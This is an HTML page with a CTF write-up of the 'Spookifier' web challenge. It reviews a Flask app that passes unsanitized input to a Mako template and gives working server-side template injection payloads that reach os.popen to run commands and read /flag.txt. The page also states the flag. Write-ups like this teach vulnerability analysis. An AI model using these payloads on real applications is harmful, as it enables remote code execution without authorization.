<!doctype html><html lang=en><head><title>Spookifier :: Soviet's CTF Write-UPs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Server-Side Template Injection vulnerability in flask application with Mako template system"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/ctf/hacktheboo/web/spookifier/><link rel=stylesheet href=/style.css><link rel=stylesheet href=/scss/attach.css><link rel="shortcut icon" href=/img/theme-colors/red.png><link rel=apple-touch-icon href=/img/theme-colors/red.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Spookifier"><meta property="og:description" content="Server-Side Template Injection vulnerability in flask application with Mako template system"><meta property="og:url" content="/ctf/hacktheboo/web/spookifier/"><meta property="og:site_name" content="Soviet's CTF Write-UPs"><meta property="og:image" content="/img/favicon/red.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-11-06 19:25:08 +0100 +0100"></head><body class=red><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>SovietBeast</div></a></div></div></header><div class=content><article class=post><h1 class=post-title><a href=/ctf/hacktheboo/web/spookifier/>Spookifier</a></h1><div class=post-meta><time class=post-date>2022-11-06 ::</time></div><div class=post-content><div><section class=attachments><label>Attachments</label><div class=attachments-files><ul><li><a class="tooltipped tooltipped-n" aria-label=Download href=/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip download>web_spookifier.zip</a>
<a class="new-tab tooltipped tooltipped-n" aria-label="Open in new tab" href=/ctf/hacktheboo/web/spookifier/files/web_spookifier.zip target=_blank></a><div class=attachment-size>(30kb)</div></li></ul></div></section><h1 id=spookifier>Spookifier<a href=#spookifier class=hanchor arialabel=Anchor>&#8983;</a></h1><blockquote><p>There&rsquo;s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?</p></blockquote><h1 id=information-gathering>Information Gathering<a href=#information-gathering class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=the-application-at-a-glance->The application at-a-glance üîç<a href=#the-application-at-a-glance- class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Appication generate &ldquo;SpooOOooOOooooooOookkkkkyyyyy&rdquo; names from user input.</p><p><img src=images/0.png alt=Untitled></p><p><img src=images/1.png alt=Untitled></p><h2 id=source-code-review>Source code review<a href=#source-code-review class=hanchor arialabel=Anchor>&#8983;</a></h2><p>All source code was supplied but only relevant parts will be highlighted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#main.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Blueprint, request
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_mako <span style=color:#f92672>import</span> render_template
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> application.util <span style=color:#f92672>import</span> spookify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>web <span style=color:#f92672>=</span> Blueprint(<span style=color:#e6db74>&#39;web&#39;</span>, __name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@web</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    text <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;text&#39;</span>)  <span style=color:#75715e># Here &#34;text&#34; is user input</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(text):
</span></span><span style=display:flex><span>        converted <span style=color:#f92672>=</span> spookify(text) <span style=color:#75715e># And is passed to spookify func without any sanityzation</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>,output<span style=color:#f92672>=</span>converted)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>,output<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)a
</span></span></code></pre></div><p>In <code>main.py</code> file <code>text</code> parameter from URL is directly passed to <code>spookify</code> function without sanityzation. After function <code>spookify</code> return it is rendered as template.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>spookify</span>(text):
</span></span><span style=display:flex><span>	converted_fonts <span style=color:#f92672>=</span> change_font(text_list<span style=color:#f92672>=</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> generate_render(converted_fonts<span style=color:#f92672>=</span>converted_fonts)
</span></span></code></pre></div><p><code>spookify</code> function calls <code>change_font</code> func and passed <code>text</code> parameter still no sanitization. After <code>change_font</code> return it is rendered and returned.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_font</span>(text_list):
</span></span><span style=display:flex><span>	text_list <span style=color:#f92672>=</span> [<span style=color:#f92672>*</span>text_list]
</span></span><span style=display:flex><span>	current_font <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>	all_fonts <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	add_font_to_list <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> text,font_type : (
</span></span><span style=display:flex><span>		[current_font<span style=color:#f92672>.</span>append(globals()[font_type]<span style=color:#f92672>.</span>get(i, <span style=color:#e6db74>&#39; &#39;</span>)) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> text], all_fonts<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(current_font)), current_font<span style=color:#f92672>.</span>clear()
</span></span><span style=display:flex><span>		) <span style=color:#f92672>and</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	add_font_to_list(text_list, <span style=color:#e6db74>&#39;font1&#39;</span>)
</span></span><span style=display:flex><span>	add_font_to_list(text_list, <span style=color:#e6db74>&#39;font2&#39;</span>)
</span></span><span style=display:flex><span>	add_font_to_list(text_list, <span style=color:#e6db74>&#39;font3&#39;</span>)
</span></span><span style=display:flex><span>	add_font_to_list(text_list, <span style=color:#e6db74>&#39;font4&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> all_fonts
</span></span></code></pre></div><p>Function <code>change_font</code> still do not sanitizate data.</p><h1 id=the-bug>The Bug<a href=#the-bug class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Application lack sanitization. User input is directly passed to template engine allowing to SSTI (Server Side Template Injection) attack to happend.</p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=execution>Execution<a href=#execution class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Payload: <code>${self.module.cache.util.os.popen("cat+/flag.txt").read()}</code></p><p><a href=https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/>Python context free payloads in Mako templates</a></p><p><img src=images/Untitled%202.png alt=Untitled></p><h2 id=explanation>Explanation<a href=#explanation class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=why-this-is-even-possible>Why this is even possible?<a href=#why-this-is-even-possible class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Application fully trust user to not supply any malicious input. By that do not validate input data. This allows attacker or any malicious actor to take advantage of running application.</p><h3 id=payload>Payload<a href=#payload class=hanchor arialabel=Anchor>&#8983;</a></h3><p><code>${self.module.cache.util.os.popen("cat+/flag.txt").read()}</code></p><p>To understand why code execute and why it looks slightly different from article mentioned earlier payload could be understand as:</p><ul><li><code>self</code> this references module that legitimate code execute output of <code>${self}</code> is <code>&lt;mako.runtime.TemplateNamespace object at 0x7f93963278b0></code></li><li><code>module</code> this is current loaded module <code>&lt;module 'memory:0x7f93961eec70'></code></li><li><code>cache</code> is <code>mako</code> template function module <code>&lt;module 'mako.cache' from '/usr/local/lib/python3.8/site-packages/mako/cache.py'></code></li><li><code>util</code> is another mako module and it is importig <code>os</code> module built-in python module allowing to execute shell commands</li><li><code>os</code> this allows to execute commands on system <code>&lt;module 'os' from '/usr/local/lib/python3.8/os.py'></code></li></ul><p>All those modules are imported like <code>self</code> importnig <code>module</code>, <code>module</code> importing cache etc.</p><p>By this time payload looks something like <code>${self.module.cache.util.os}</code> which translate</p><p>From module I currently execute code go to one of my imports <code>module</code> from that go to one of module imports named <code>cache</code> from <code>cache</code> go to his <code>util</code> imports, from that go to <code>os</code> import.</p><p>From that point there is possibility to use all functions from <code>os</code> built-in library.</p><p>For example <code>system()</code> so full payload looks: <code>${self.module.cache.util.os.system('id')}</code></p><p><img src=images/Untitled%203.png alt=Untitled></p><p>And it returned 0. Looks like root right? Not exactly.</p><p>If command is <code>whoami</code> it is still 0. Python system command return <code>exit code</code> not exactly of command output.</p><p><img src=images/Untitled%204.png alt=Untitled></p><p>To read <code>stdout</code> of executed command <code>popen()</code> function need to be used.</p><p>With payload as: <code>${self.module.cache.util.os.popen('whoami')}</code></p><p>We got something different <code>os object</code></p><p><code>read()</code> function can be used to get output we want.</p><p><img src=images/Untitled%205.png alt=Untitled></p><p>With payload as: <code>${self.module.cache.util.os.popen('whoami').read()}</code></p><p><img src=images/Untitled%206.png alt=Untitled></p><p>In <code>Docker</code> file flag is copied to <code>/flag.txt</code></p><p>With paylaod as: <code>${self.module.cache.util.os.popen('cat+/flag.txt').read()}</code></p><p><img src=images/Untitled%207.png alt=Untitled></p><h1 id=flag>Flag<a href=#flag class=hanchor arialabel=Anchor>&#8983;</a></h1><p><code>HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}</code></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>¬© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>